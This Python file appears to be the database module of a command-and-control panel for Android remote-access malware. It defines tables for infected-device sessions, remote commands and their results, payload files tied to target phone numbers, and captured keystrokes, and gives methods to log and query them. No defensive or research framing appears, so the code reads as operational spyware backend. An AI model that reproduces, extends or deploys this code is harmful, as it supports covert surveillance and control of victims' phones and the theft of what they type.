import sqlite3
import json
import os
from datetime import datetime
from config import Config

class Database:
    def __init__(self):
        self.db_path = Config.DATABASE_URL.replace('sqlite:///', '')
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        self.init_db()
    
    def get_connection(self):
        return sqlite3.connect(self.db_path)
    
    def init_db(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    device_name TEXT,
                    device_model TEXT,
                    android_version TEXT,
                    ip_address TEXT,
                    battery INTEGER,
                    status TEXT DEFAULT 'active',
                    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Commands table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    command TEXT NOT NULL,
                    result TEXT,
                    status TEXT DEFAULT 'pending',
                    executed_at DATETIME
                )
            ''')
            
            # Payloads table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS payloads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    payload_id TEXT UNIQUE NOT NULL,
                    filename TEXT,
                    target_number TEXT,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    downloaded BOOLEAN DEFAULT 0
                )
            ''')
            
            # Keylogs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    log_data TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
    
    # Session Methods
    def add_session(self, session_id, device_info):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO sessions 
                (session_id, device_name, device_model, android_version, ip_address, battery, status, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (session_id, device_info.get('name', 'Unknown'), device_info.get('model', 'Unknown'),
                  device_info.get('android', 'Unknown'), device_info.get('ip', '0.0.0.0'),
                  device_info.get('battery', 0), 'active', datetime.now().isoformat()))
            conn.commit()
    
    def get_active_sessions(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM sessions WHERE status = "active" ORDER BY last_seen DESC')
            return cursor.fetchall()
    
    def kill_session(self, session_id):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('UPDATE sessions SET status = "killed" WHERE session_id = ?', (session_id,))
            conn.commit()
    
    # Command Methods
    def add_command(self, session_id, command, result):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO commands (session_id, command, result, status, executed_at)
                VALUES (?, ?, ?, ?, ?)
            ''', (session_id, command, result, 'executed', datetime.now().isoformat()))
            conn.commit()
    
    # Payload Methods
    def add_payload(self, payload_id, filename, target_number=None):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO payloads (payload_id, filename, target_number)
                VALUES (?, ?, ?)
            ''', (payload_id, filename, target_number))
            conn.commit()
    
    def mark_downloaded(self, payload_id):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('UPDATE payloads SET downloaded = 1 WHERE payload_id = ?', (payload_id,))
            conn.commit()
    
    # Keylog Methods
    def add_keylog(self, session_id, log_data):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO keylogs (session_id, log_data) VALUES (?, ?)', (session_id, log_data))
            conn.commit()
    
    def get_keylogs(self, session_id, limit=100):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM keylogs WHERE session_id = ? ORDER BY timestamp DESC LIMIT ?
            ''', (session_id, limit))
            return cursor.fetchall()
    
    # Statistics
    def get_stats(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            stats = {}
            cursor.execute('SELECT COUNT(*) FROM sessions')
            stats['total_sessions'] = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM sessions WHERE status = "active"')
            stats['active_sessions'] = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM commands')
            stats['total_commands'] = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM keylogs')
            stats['total_keylogs'] = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM payloads')
            stats['total_payloads'] = cursor.fetchone()[0]
            return stats

db = Database()
